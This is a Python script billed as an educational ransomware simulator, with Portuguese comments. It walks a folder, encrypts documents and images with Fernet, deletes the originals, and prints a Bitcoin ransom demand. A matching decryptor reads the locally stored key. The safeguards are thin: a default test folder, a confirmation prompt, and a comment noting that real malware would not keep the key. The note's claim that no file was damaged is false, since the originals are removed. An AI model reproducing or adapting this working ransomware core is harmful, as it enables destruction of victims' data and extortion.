# ransomware_sim.py
import os
import sys
from cryptography.fernet import Fernet

class RansomwareSimulado:
    """Simulação educacional de ransomware"""
    
    def __init__(self, pasta_alvo="arquivos_teste"):
        self.pasta_alvo = pasta_alvo
        self.chave = None
        self.extensoes_alvo = ['.txt', '.docx', '.pdf', '.jpg', '.png', '.xlsx']
        
    def gerar_chave(self):
        """Gera uma chave de criptografia"""
        self.chave = Fernet.generate_key()
        self.cipher = Fernet(self.chave)
        
        # Salva a chave localmente (NUNCA faça isso em malware real!)
        with open("chave_secreta.key", "wb") as key_file:
            key_file.write(self.chave)
        print(f"🔑 Chave gerada e salva em 'chave_secreta.key'")
        
    def listar_arquivos(self):
        """Lista todos os arquivos vulneráveis na pasta alvo"""
        arquivos_alvo = []
        for root, dirs, files in os.walk(self.pasta_alvo):
            for file in files:
                if any(file.endswith(ext) for ext in self.extensoes_alvo):
                    arquivos_alvo.append(os.path.join(root, file))
        return arquivos_alvo
    
    def criptografar_arquivo(self, caminho_arquivo):
        """Criptografa um único arquivo"""
        try:
            with open(caminho_arquivo, 'rb') as file:
                conteudo = file.read()
            
            conteudo_criptografado = self.cipher.encrypt(conteudo)
            
            with open(caminho_arquivo + '.encrypted', 'wb') as file:
                file.write(conteudo_criptografado)
            
            # Remove o arquivo original
            os.remove(caminho_arquivo)
            
            return True
        except Exception as e:
            print(f"❌ Erro ao criptografar {caminho_arquivo}: {e}")
            return False
    
    def executar_ataque(self):
        """Executa o ataque de ransomware"""
        print("\n" + "="*60)
        print("⚠️  SIMULAÇÃO DE RANSOMWARE - AMBIENTE CONTROLADO ⚠️")
        print("="*60)
        
        # Gera a chave de criptografia
        self.gerar_chave()
        
        # Lista arquivos alvo
        arquivos = self.listar_arquivos()
        print(f"\n📁 Encontrados {len(arquivos)} arquivos para criptografar")
        
        # Criptografa cada arquivo
        sucessos = 0
        for arquivo in arquivos:
            if self.criptografar_arquivo(arquivo):
                sucessos += 1
                print(f"🔒 Criptografado: {arquivo}")
        
        # Mensagem de resgate
        self.exibir_mensagem_resgate(sucessos, len(arquivos))
        
    def exibir_mensagem_resgate(self, sucessos, total):
        """Exibe a mensagem de resgate simulada"""
        print("\n" + "="*60)
        print("🚨 SEUS ARQUIVOS FORAM CRIPTOGRAFADOS! 🚨")
        print("="*60)
        print(f"\n📊 Status: {sucessos}/{total} arquivos afetados")
        print("""
💸 MENSAGEM DE RESGATE (SIMULAÇÃO):

Todos os seus arquivos importantes foram criptografados!

Para recuperar seus dados, você precisa pagar R$ 3.000,00 em Bitcoin para a carteira:
    bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

⚠️ ATENÇÃO: Este é um SIMULADOR educacional!
    Nenhum arquivo foi realmente danificado.
    Execute o decriptador para restaurar os dados.
        """)
        print("="*60)
        
    def descriptografar(self):
        """Descriptografa os arquivos (função de recuperação)"""
        print("\n🔓 INICIANDO DESCRIPTOGRAFIA...")
        
        # Carrega a chave
        with open("chave_secreta.key", "rb") as key_file:
            self.chave = key_file.read()
        self.cipher = Fernet(self.chave)
        
        # Lista todos os arquivos criptografados
        arquivos_cripto = []
        for root, dirs, files in os.walk(self.pasta_alvo):
            for file in files:
                if file.endswith('.encrypted'):
                    arquivos_cripto.append(os.path.join(root, file))
        
        # Descriptografa cada arquivo
        for arquivo_cripto in arquivos_cripto:
            try:
                with open(arquivo_cripto, 'rb') as file:
                    conteudo = file.read()
                
                conteudo_original = self.cipher.decrypt(conteudo)
                
                # Restaura o nome original
                arquivo_original = arquivo_cripto.replace('.encrypted', '')
                with open(arquivo_original, 'wb') as file:
                    file.write(conteudo_original)
                
                # Remove o arquivo criptografado
                os.remove(arquivo_cripto)
                print(f"✅ Restaurado: {arquivo_original}")
                
            except Exception as e:
                print(f"❌ Erro ao restaurar {arquivo_cripto}: {e}")
        
        print("\n🎉 TODOS OS ARQUIVOS FORAM RESTAURADOS COM SUCESSO!")

if __name__ == "__main__":
    print("\n⚠️  EXECUTANDO EM AMBIENTE CONTROLADO ⚠️")
    resposta = input("Deseja executar o ransomware simulado? (s/n): ")
    
    if resposta.lower() == 's':
        ransomware = RansomwareSimulado()
        ransomware.executar_ataque()
        
        print("\nPara restaurar os arquivos, execute o decriptador.")
    else:
        print("Operação cancelada.")